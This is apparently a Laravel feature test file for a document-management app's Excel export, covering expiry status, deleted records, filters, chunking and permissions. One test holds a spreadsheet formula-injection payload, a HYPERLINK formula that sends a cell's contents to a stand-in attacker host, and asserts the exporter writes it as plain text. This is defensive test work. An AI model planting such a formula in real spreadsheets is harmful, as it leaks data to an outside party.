<?php

namespace Tests\Feature;

use App\Filament\Resources\Documents\Pages\ListDocuments;
use App\Filament\Widgets\ExpiringDocuments;
use App\Models\Company;
use App\Models\Document;
use App\Models\DocumentType;
use App\Models\DocumentVersion;
use App\Models\ReminderTemplate;
use App\Models\User;
use App\Services\DocumentSpreadsheetExporter;
use Database\Seeders\DocumentSeeder;
use Filament\Facades\Filament;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Livewire\Livewire;
use OpenSpout\Reader\XLSX\Reader;
use Tests\TestCase;

class DocumentExcelExportTest extends TestCase
{
    use RefreshDatabase;

    private string $path;

    protected function setUp(): void
    {
        parent::setUp();
        $this->travelTo(now()->setDate(2026, 10, 9)->setTime(9, 0));
        Filament::setCurrentPanel(Filament::getPanel('admin'));
        $this->seed(DocumentSeeder::class);
        ReminderTemplate::factory()->create(['schedule_mode' => 'specific_days', 'scheduled_days' => [30]]);
        $this->path = tempnam(sys_get_temp_dir(), 'lms-xlsx-');
    }

    protected function tearDown(): void
    {
        @unlink($this->path);
        parent::tearDown();
    }

    private function signIn(): void
    {
        $user = User::factory()->create();
        $user->givePermissionTo(['ViewAny:Document', 'View:Document']);
        $this->actingAs($user);
    }

    private function document(string $title, ?string $expiry, array $attributes = [], bool $hasExpiry = true): Document
    {
        $document = Document::factory()->create([
            'title' => $title, 'document_type_id' => DocumentType::factory()->create(['has_expiry' => $hasExpiry])->id,
            'company_id' => Company::factory()->create(['name' => 'PT '.$title])->id, ...$attributes,
        ]);
        $version = DocumentVersion::factory()->create([
            'document_id' => $document->id, 'issued_date' => '2026-01-15', 'expiry_date' => $expiry, 'file_name' => Str($title)->slug().'.pdf',
        ]);
        $document->current_version_id = $version->id;
        $document->save();

        return $document;
    }

    /** @return array{0: string, 1: list<list<mixed>>} */
    private function readSheet(): array
    {
        $reader = new Reader;
        $reader->open($this->path);
        $rows = [];
        $name = '';
        foreach ($reader->getSheetIterator() as $sheet) {
            $name = $sheet->getName();
            foreach ($sheet->getRowIterator() as $row) {
                $rows[] = $row->toArray();
            }
            break;
        }
        $reader->close();

        return [$name, $rows];
    }

    public function test_workbook_contains_headers_and_one_row_per_document_with_computed_columns(): void
    {
        $soon = $this->document('Kontrak Soon', '2026-10-19', ['document_number' => 'NO-1', 'counterparty' => 'PT Mitra']);
        $expired = $this->document('Kontrak Lewat', '2026-10-06');
        $far = $this->document('Kontrak Jauh', '2027-10-09');
        $noExpiry = $this->document('Akta Tetap', null, hasExpiry: false);

        app(DocumentSpreadsheetExporter::class)->write(Document::query()->orderBy('id'), $this->path);

        [$sheet, $rows] = $this->readSheet();
        $this->assertSame('Dokumen', $sheet);
        $this->assertSame(DocumentSpreadsheetExporter::HEADERS, $rows[0]);
        $this->assertCount(5, $rows);

        $byTitle = collect($rows)->skip(1)->keyBy(0);
        $row = $byTitle['Kontrak Soon'];
        $this->assertSame('NO-1', $row[1]);
        $this->assertSame('PT Kontrak Soon', $row[2]);
        $this->assertSame($soon->documentType->name, $row[3]);
        $this->assertSame('PT Mitra', $row[4]);
        $this->assertSame($soon->pic->name, $row[5]);
        $this->assertSame('2026-01-15', $row[6]->format('Y-m-d'));
        $this->assertSame('2026-10-19', $row[7]->format('Y-m-d'));
        $this->assertSame('Segera Berakhir', $row[8]);
        $this->assertSame(10, $row[9]);
        $this->assertSame('v1', $row[10]);
        $this->assertSame($soon->currentVersion->stored_name, $row[11]);
        $this->assertSame('2026-10-09', $row[12]->format('Y-m-d'));

        $this->assertSame(['Kedaluwarsa', -3], [$byTitle['Kontrak Lewat'][8], $byTitle['Kontrak Lewat'][9]]);
        $this->assertSame(['Aktif', 365], [$byTitle['Kontrak Jauh'][8], $byTitle['Kontrak Jauh'][9]]);
        $this->assertSame(['Tanpa Masa Berlaku', '', ''], [$byTitle['Akta Tetap'][8], $byTitle['Akta Tetap'][7], $byTitle['Akta Tetap'][9]]);
        $this->assertNotNull($expired);
        $this->assertNotNull($far);
        $this->assertNotNull($noExpiry);
    }

    public function test_deleted_documents_are_marked_as_deleted_instead_of_showing_an_expiry_status(): void
    {
        $this->document('Kontrak Hidup', '2026-10-19');
        $deleted = $this->document('Kontrak Dihapus', '2027-10-09', ['document_number' => 'NO-9']);
        $deleted->delete();
        $deletedExpired = $this->document('Kontrak Dihapus Lewat', '2026-10-01');
        $deletedExpired->delete();

        app(DocumentSpreadsheetExporter::class)->write(Document::query()->withTrashed()->orderBy('id'), $this->path);

        $byTitle = collect($this->readSheet()[1])->skip(1)->keyBy(0);
        $this->assertCount(3, $byTitle);
        $this->assertSame(['Segera Berakhir', 10], [$byTitle['Kontrak Hidup'][8], $byTitle['Kontrak Hidup'][9]]);
        $this->assertSame(['Dihapus', ''], [$byTitle['Kontrak Dihapus'][8], $byTitle['Kontrak Dihapus'][9]]);
        $this->assertSame(['Dihapus', ''], [$byTitle['Kontrak Dihapus Lewat'][8], $byTitle['Kontrak Dihapus Lewat'][9]]);
        // Tanggal berakhir dan data lain tetap apa adanya; hanya status dan sisa hari yang tidak berlaku untuk dokumen terhapus.
        $this->assertSame('NO-9', $byTitle['Kontrak Dihapus'][1]);
        $this->assertSame('2027-10-09', $byTitle['Kontrak Dihapus'][7]->format('Y-m-d'));
    }

    public function test_free_text_starting_with_an_equals_sign_is_exported_as_text_not_as_a_formula(): void
    {
        $payload = '=HYPERLINK("https://attacker.test/?d="&A3,"PT Mitra")';
        $this->document('=1+1', '2026-10-19', ['counterparty' => $payload, 'document_number' => '=SUM(A1:A9)']);

        app(DocumentSpreadsheetExporter::class)->write(Document::query()->orderBy('id'), $this->path);

        $zip = new \ZipArchive;
        $this->assertTrue($zip->open($this->path));
        $sheetXml = $zip->getFromName('xl/worksheets/sheet1.xml');
        $zip->close();
        $this->assertStringNotContainsString('<f>', $sheetXml);

        $row = collect($this->readSheet()[1])->skip(1)->first();
        $this->assertSame(['=1+1', '=SUM(A1:A9)', $payload], [$row[0], $row[1], $row[4]]);
    }

    public function test_list_export_marks_deleted_documents_when_the_trashed_filter_includes_them(): void
    {
        $this->signIn();
        $this->document('Kontrak Hidup', '2026-10-19');
        $this->document('Kontrak Dihapus', '2027-10-09')->delete();

        $component = Livewire::test(ListDocuments::class)->filterTable('trashed', true)->callTableAction('exportExcel')->assertFileDownloaded();
        app(DocumentSpreadsheetExporter::class)->write($component->instance()->getTableQueryForExport(), $this->path);
        $byTitle = collect($this->readSheet()[1])->skip(1)->keyBy(0);
        $this->assertSame(['Segera Berakhir', 'Dihapus'], [$byTitle['Kontrak Hidup'][8], $byTitle['Kontrak Dihapus'][8]]);

        $component->filterTable('trashed', null);
        app(DocumentSpreadsheetExporter::class)->write($component->instance()->getTableQueryForExport(), $this->path);
        $this->assertSame(['Kontrak Hidup'], collect($this->readSheet()[1])->skip(1)->pluck(0)->all());
    }

    public function test_download_response_is_a_private_xlsx_attachment(): void
    {
        $this->document('Kontrak Satu', '2026-12-01');

        $response = app(DocumentSpreadsheetExporter::class)->download(Document::query(), 'dokumen');

        $this->assertSame('application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', $response->headers->get('Content-Type'));
        $this->assertStringContainsString('no-store', $response->headers->get('Cache-Control'));
        $this->assertMatchesRegularExpression('/filename=dokumen-20261009-\d{6}\.xlsx/', $response->headers->get('Content-Disposition'));
        ob_start();
        $response->sendContent();
        $content = ob_get_clean();
        $this->assertStringStartsWith('PK', $content);
        file_put_contents($this->path, $content);
        $this->assertCount(2, $this->readSheet()[1]);
    }

    public function test_documents_without_a_version_are_exported_with_blank_columns(): void
    {
        Document::factory()->create(['title' => 'Belum Ada Versi']);

        app(DocumentSpreadsheetExporter::class)->write(Document::query(), $this->path);

        $row = $this->readSheet()[1][1];
        $this->assertSame('Belum Ada Versi', $row[0]);
        $this->assertSame(['', '', '', ''], [$row[6], $row[7], $row[9], $row[10]]);
    }

    public function test_more_rows_than_one_chunk_are_all_exported_once(): void
    {
        $total = DocumentSpreadsheetExporter::CHUNK_SIZE * 2 + 20;
        $shared = [
            'company_id' => Company::factory()->create()->id, 'document_type_id' => DocumentType::factory()->create()->id,
            'pic_user_id' => User::factory()->create()->id,
        ];
        Document::factory()->count($total)->sequence(fn ($sequence): array => ['title' => 'Dokumen '.$sequence->index])->create($shared);

        app(DocumentSpreadsheetExporter::class)->write(Document::query(), $this->path);

        $rows = $this->readSheet()[1];
        $this->assertCount($total + 1, $rows);
        $this->assertCount($total, collect($rows)->skip(1)->pluck(0)->unique());
    }

    public function test_list_export_follows_active_search_and_filters(): void
    {
        $this->signIn();
        $match = $this->document('Kontrak Cocok', '2026-11-10', ['counterparty' => 'PT Nusantara']);
        $this->document('Kontrak Lain', '2026-11-10', ['counterparty' => 'CV Lain']);
        $this->document('Kontrak Nusantara Jauh', '2027-06-10', ['counterparty' => 'PT Nusantara']);

        $component = Livewire::test(ListDocuments::class)
            ->searchTable('nusantara')
            ->filterTable('expiry_range', ['expiry_from' => '2026-11-01', 'expiry_until' => '2026-11-30'])
            ->callTableAction('exportExcel')->assertHasNoErrors()->assertFileDownloaded();

        app(DocumentSpreadsheetExporter::class)->write($component->instance()->getTableQueryForExport(), $this->path);
        $titles = collect($this->readSheet()[1])->skip(1)->pluck(0)->all();
        $this->assertSame([$match->title], $titles);
    }

    public function test_dashboard_widget_exports_only_documents_expiring_within_thirty_days(): void
    {
        $this->signIn();
        $this->document('Hari Ini', '2026-10-09');
        $this->document('Hari Ke Tiga Puluh', '2026-11-08');
        $this->document('Sudah Lewat', '2026-10-08');
        $this->document('Terlalu Jauh', '2026-11-09');
        $this->document('Tanpa Batas', null, hasExpiry: false);

        $component = Livewire::test(ExpiringDocuments::class)->callTableAction('exportExcel')->assertFileDownloaded();

        app(DocumentSpreadsheetExporter::class)->write($component->instance()->getTableQueryForExport(), $this->path);
        $titles = collect($this->readSheet()[1])->skip(1)->pluck(0)->sort()->values()->all();
        $this->assertSame(['Hari Ini', 'Hari Ke Tiga Puluh'], $titles);
    }

    public function test_export_button_is_hidden_without_view_permission(): void
    {
        $user = User::factory()->create();
        $user->givePermissionTo(['View:Document']);
        $this->actingAs($user);

        Livewire::test(ListDocuments::class)->assertForbidden();
        $this->assertFalse(ExpiringDocuments::canView());
    }
}
